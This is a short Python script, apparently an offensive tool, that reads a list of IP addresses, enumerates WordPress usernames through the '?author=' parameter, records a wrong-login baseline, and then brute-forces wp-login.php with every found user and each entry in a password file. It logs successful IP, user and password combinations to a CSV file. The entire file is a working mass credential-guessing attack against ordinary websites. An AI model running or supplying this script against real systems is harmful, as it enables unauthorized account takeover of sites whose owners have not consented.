from bs4 import BeautifulSoup
import urllib.request
import sys
import random
import requests
import csv
addresses = 'ip.txt'
users = []

# Function to login
def post(): 
    with requests.Session() as s:
        s.post(f"http://{ip}/wp-login.php",data = login_and_password)
        request = s.get(f'http://{ip}/wp-admin/')
        return request.text
with open(addresses, "r") as addresses:
    with open ("result.csv","a") as result:
        for ip in addresses:
            for i in range(1,1000): # finding users
                try:
                    response = urllib.request.urlopen(urllib.request.Request(f"http://{ip}/?author={i}"))
                    data = response.read()
                    soup = BeautifulSoup(data, "html.parser")
                    users.append(soup.title.string.split(" – user's Blog!")[0])
                except urllib.error.HTTPError:
                    print('all users listed')
                    break
                
            # Wrong log in  to see response to wrong login
            false_user = str(random.choice([x for x in range(10) if x not in users]))
            login_and_password = {"log":f"{false_user}","pwd":"qwerty"}
            wrong_login_response = post()

            with open ("./passwords.txt") as passwords:
                for password in passwords:
                    z = password.strip()
                    for user in users:
                        login_and_password = {"log":f"{user}","pwd":f"{z}"}
                        if post() != wrong_login_response:
                            print(ip,login_and_password)
                            list_of_ip_log_pwd = [ip,user,password]
                            writer = csv.writer(result)
                            writer.writerow(list_of_ip_log_pwd)
